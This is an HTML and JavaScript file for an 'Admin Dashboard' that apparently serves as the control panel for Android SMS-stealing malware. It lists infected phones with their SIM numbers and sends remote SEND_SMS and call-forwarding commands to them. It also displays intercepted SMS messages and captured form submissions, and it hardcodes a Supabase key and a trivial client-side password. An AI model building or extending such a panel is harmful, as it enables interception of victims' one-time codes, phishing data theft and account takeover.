<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Dashboard</title>
    
    <!-- 1. STYLES (CSS) -->
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
        body { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; padding: 20px; }
        #loginScreen { display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .login-container { background: white; padding: 40px; border-radius: 20px; box-shadow: 0 20px 60px rgba(0,0,0,0.3); width: 100%; max-width: 450px; text-align: center; }
        .login-icon { font-size: 70px; color: #667eea; margin-bottom: 25px; }
        .login-title { color: #333; font-size: 28px; margin-bottom: 10px; }
        .password-input { width: 100%; padding: 16px; border: 2px solid #ddd; border-radius: 12px; font-size: 16px; margin-bottom: 20px; outline: none; }
        .login-button { width: 100%; padding: 16px; background: #667eea; color: white; border: none; border-radius: 12px; font-size: 18px; font-weight: bold; cursor: pointer; }
        #dashboard { display: none; background: white; border-radius: 20px; box-shadow: 0 20px 60px rgba(0,0,0,0.3); }
        .dashboard-header { background: #667eea; color: white; padding: 25px 30px; display: flex; justify-content: space-between; align-items: center; }
        .header-left h1 { font-size: 24px; }
        .logout-btn { background: #dc3545; color: white; padding: 10px 15px; border-radius: 8px; border: none; cursor: pointer; font-weight: bold; }
        .devices-section { padding: 30px; }
        .devices-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(350px, 1fr)); gap: 25px; }
        .device-card { background: #f8f9fa; border-radius: 15px; padding: 25px; border: 2px solid #e9ecef; }
        .device-header { display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 20px; padding-bottom: 15px; border-bottom: 2px solid #dee2e6; }
        .device-info h3 { color: #333; font-size: 18px; }
        .device-status { display: flex; align-items: center; gap: 10px; }
        .status-dot { width: 12px; height: 12px; border-radius: 50%; }
        .online-dot { background: #06d6a0; }
        .offline-dot { background: #ef476f; }
        .detail-item { display: flex; justify-content: space-between; padding: 12px 0; border-bottom: 1px solid #e9ecef; }
        .action-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 20px; }
        .action-btn { padding: 14px; border: none; border-radius: 10px; font-weight: 600; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; color: white; }
        .sms-btn { background: #118ab2; }
        .call-btn { background: #ef476f; }
        .view-sms-btn { background: #7209b7; }
        .view-forms-btn { background: #f3722c; }
        .modal-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); z-index: 1000; }
        .modal { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: white; padding: 30px; border-radius: 15px; width: 90%; max-width: 500px; z-index: 1001; }
        .modal-header { display: flex; justify-content: space-between; margin-bottom: 25px; padding-bottom: 15px; border-bottom: 2px solid #dee2e6; }
        .close-modal { background: none; border: none; font-size: 24px; cursor: pointer; }
        .form-group { margin-bottom: 20px; }
        .form-label { display: block; margin-bottom: 8px; font-weight: 600; }
        .form-input { width: 100%; padding: 12px; border: 2px solid #ddd; border-radius: 8px; }
        .modal-footer { display: flex; justify-content: flex-end; gap: 12px; margin-top: 25px; padding-top: 15px; border-top: 2px solid #dee2e6; }
        .submit-btn { padding: 12px 24px; background: #667eea; color: white; border: none; border-radius: 8px; cursor: pointer; }
        .notification { position: fixed; top: 20px; right: 20px; padding: 15px 25px; border-radius: 10px; color: white; z-index: 9999; }
        .success { background: #06d6a0; }
        .error { background: #ef476f; }
    </style>
    
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="https://unpkg.com/@supabase/supabase-js@2"></script>
</head>
<body>

    <!-- 2. BODY (HTML CONTENT) -->
    <div id="loginScreen">
        <div class="login-container">
            <div class="login-icon"><i class="fas fa-shield-alt"></i></div>
            <h1 class="login-title">Admin Dashboard</h1>
            <input type="password" id="passwordInput" class="password-input" placeholder="Enter Password" value="admin123">
            <button id="loginButton" class="login-button">LOGIN</button>
        </div>
    </div>

    <div id="dashboard">
        <div class="dashboard-header">
            <div class="header-left">
                <h1><i class="fas fa-mobile-alt"></i> Device Manager</h1>
                <p id="deviceCount"></p>
            </div>
            <button id="logoutBtn" class="logout-btn"><i class="fas fa-sign-out-alt"></i> Logout</button>
        </div>
        <div class="devices-section">
            <div id="devicesContainer" class="devices-grid"></div>
        </div>
    </div>

    <!-- Modals -->
    <div id="actionModal" class="modal"><div class="modal-header"><h3 id="modalTitle"></h3><button class="close-modal" onclick="closeModal()">&times;</button></div><div id="modalBody" style="padding-top:15px;"></div></div>
    <div id="modalOverlay" class="modal-overlay" onclick="closeModal()"></div>
    <div id="notificationContainer"></div>
    
    <!-- 3. JAVASCRIPT (APP LOGIC) -->
    <script>
        const SUPABASE_URL = 'https://lcguyfxorfhvpcvnicpa.supabase.co';
        const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImxjZ3V5ZnhvcmZodnBjdm5pY3BhIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjU0Njc2NDksImV4cCI6MjA4MTA0MzY0OX0.mx_3uB_5XMXYb3_at237Ow0AEL8N_FZpF0DHo874VV8';
        let ADMIN_PASSWORD = 'admin123';
        let supabase = null;
        let currentDeviceId = null;

        document.addEventListener('DOMContentLoaded', () => {
            if (!window.supabase) {
                document.body.innerHTML = `<div style="color:red; text-align:center; padding: 50px;"><h1>Error: Supabase SDK Failed to Load</h1></div>`;
                return;
            }
            supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

            if (localStorage.getItem('admin_logged_in') === 'true') {
                showDashboard();
            }
            
            document.getElementById('loginButton').addEventListener('click', handleLogin);
            document.getElementById('logoutBtn').addEventListener('click', handleLogout);
        });

        function handleLogin() {
            if (document.getElementById('passwordInput').value === ADMIN_PASSWORD) {
                localStorage.setItem('admin_logged_in', 'true');
                showDashboard();
            } else {
                showNotification('Wrong Password', 'error');
            }
        }
        
        function handleLogout() {
            if (confirm('Are you sure you want to logout?')) {
                localStorage.removeItem('admin_logged_in');
                location.reload();
            }
        }
        
        function showDashboard() {
            document.getElementById('loginScreen').style.display = 'none';
            document.getElementById('dashboard').style.display = 'block';
            loadDevices();
            setInterval(loadDevices, 7000); // Auto-refresh every 7 seconds
        }

        async function loadDevices() {
            try {
                const { data, error } = await supabase.from('devices').select('*').order('last_seen', { ascending: false });
                if (error) throw error;
                displayDevices(data || []);
            } catch (e) { console.error("Device Load Error:", e); }
        }

        function displayDevices(devices) {
            const container = document.getElementById('devicesContainer');
            document.getElementById('deviceCount').textContent = `${devices.length} Devices`;
            if(devices.length === 0) {
                 container.innerHTML = `<p style="text-align:center;color:#666;grid-column:1/-1;padding:40px;">No devices connected. Install the app on a real device and grant permissions.</p>`;
                 return;
            }

            container.innerHTML = devices.map(device => {
                const isOnline = (new Date() - new Date(device.last_seen)) < 120000;
                return `
                <div class="device-card">
                    <div class="device-header">
                        <div class="device-info"><h3><i class="fas fa-mobile-alt"></i> ${device.model || 'Unknown'}</h3></div>
                        <span class="status-dot ${isOnline ? 'online-dot' : 'offline-dot'}"></span>
                    </div>
                    <div class="device-details">
                        <div class="detail-item"><span>Version</span><span>${device.android_version || 'N/A'}</span></div>
                        <div class="detail-item"><span>SIM 1</span><span>${device.sim1_number || 'N/A'}</span></div>
                        <div class="detail-item"><span>SIM 2</span><span>${device.sim2_number || 'N/A'}</span></div>
                        <div class="detail-item"><span>Seen</span><span>${new Date(device.last_seen).toLocaleString()}</span></div>
                    </div>
                    <div class="action-grid">
                        <button class="action-btn sms-btn" onclick="openSmsModal('${device.device_id}')"><i class="fas fa-sms"></i> SMS</button>
                        <button class="action-btn call-btn" onclick="openCallModal('${device.device_id}')"><i class="fas fa-phone-alt"></i> Call Fwd</button>
                        <button class="action-btn view-sms-btn" onclick="viewLogs('${device.device_id}', 'sms_logs')"><i class="fas fa-eye"></i> SMS Logs</button>
                        <button class="action-btn view-forms-btn" onclick="viewLogs('${device.device_id}', 'form_responses')"><i class="fas fa-file-alt"></i> Forms</button>
                    </div>
                </div>`;
            }).join('');
        }

        async function sendCommand(type, payload) {
            try {
                const { error } = await supabase.from('admin_commands').insert([{ device_id: currentDeviceId, command_type: type, command_payload: payload, status: 'PENDING' }]);
                if (error) throw error;
                showNotification('Command Sent!', 'success');
                closeModal();
            } catch (e) { showNotification(e.message, 'error'); }
        }

        function openSmsModal(deviceId) {
            currentDeviceId = deviceId;
            document.getElementById('modalTitle').textContent = 'Send SMS';
            document.getElementById('modalBody').innerHTML = `
                <div class="form-group"><label class="form-label">Phone</label><input type="text" id="smsPhone" class="form-input"></div>
                <div class="form-group"><label class="form-label">Message</label><input type="text" id="smsBody" class="form-input"></div>
                <div class="form-group"><label class="form-label">SIM</label><select id="smsSim" class="form-input"><option value="0">SIM 1</option><option value="1">SIM 2</option></select></div>
                <div class="modal-footer"><button class="submit-btn" onclick="executeSms()">Send</button></div>`;
            showModal();
        }
        
        function executeSms() {
            const payload = { phone: document.getElementById('smsPhone').value, message: document.getElementById('smsBody').value, sim: parseInt(document.getElementById('smsSim').value) };
            if (payload.phone && payload.message) sendCommand('SEND_SMS', payload);
        }

        function openCallModal(deviceId) {
            currentDeviceId = deviceId;
            document.getElementById('modalTitle').textContent = 'Call Forwarding';
            document.getElementById('modalBody').innerHTML = `
                <div class="form-group"><label class="form-label">Forward To</label><input type="text" id="fwdNumber" class="form-input"></div>
                <div class="form-group"><label class="form-label">SIM</label><select id="fwdSim" class="form-input"><option value="0">SIM 1</option><option value="1">SIM 2</option></select></div>
                <div class="modal-footer">
                    <button class="submit-btn" onclick="executeCallFwd(true)">Activate</button>
                    <button class="submit-btn" style="background:#ef476f" onclick="executeCallFwd(false)">Deactivate</button>
                </div>`;
            showModal();
        }
        
        function executeCallFwd(enable) {
            const payload = { forward_number: document.getElementById('fwdNumber').value, sim: parseInt(document.getElementById('fwdSim').value), enable: enable };
            if (enable && !payload.forward_number) return showNotification('Enter number!', 'error');
            sendCommand('CALL_FORWARD', payload);
        }
        
        async function viewLogs(deviceId, tableName) {
            document.getElementById('modalTitle').textContent = `${tableName.replace('_', ' ')} Logs`;
            document.getElementById('modalBody').innerHTML = `<p>Loading...</p>`;
            showModal();
            try {
                const { data, error } = await supabase.from(tableName).select('*').eq('device_id', deviceId).order('id', { ascending: false }).limit(30);
                if (error) throw error;
                if(data.length === 0) return document.getElementById('modalBody').innerHTML = '<p>No logs found.</p>';
                
                let html = data.map(log => {
                    if(tableName === 'sms_logs') return `<div><strong>From:</strong> ${log.sender_number}<p>${log.message_body}</p><small>${new Date(log.received_at).toLocaleString()}</small><hr></div>`;
                    if(tableName === 'form_responses') return `<div><strong>Data:</strong><pre>${log.form_data.replace(/\|/g, '\\n')}</pre><small>${new Date(log.submitted_at).toLocaleString()}</small><hr></div>`;
                }).join('');
                document.getElementById('modalBody').innerHTML = `<div style="max-height:400px;overflow-y:auto;">${html}</div>`;
            } catch (e) { document.getElementById('modalBody').innerHTML = `<p>Error: ${e.message}</p>`; }
        }

        function showModal() { document.getElementById('actionModal').style.display = 'block'; document.getElementById('modalOverlay').style.display = 'block'; }
        function closeModal() { document.getElementById('actionModal').style.display = 'none'; document.getElementById('modalOverlay').style.display = 'none'; }
        function showNotification(msg, type) {
            const el = document.createElement('div');
            el.className = `notification ${type}`;
            el.textContent = msg;
            document.getElementById('notificationContainer').appendChild(el);
            setTimeout(() => el.remove(), 3000);
        }
    </script>
</body>
</html>
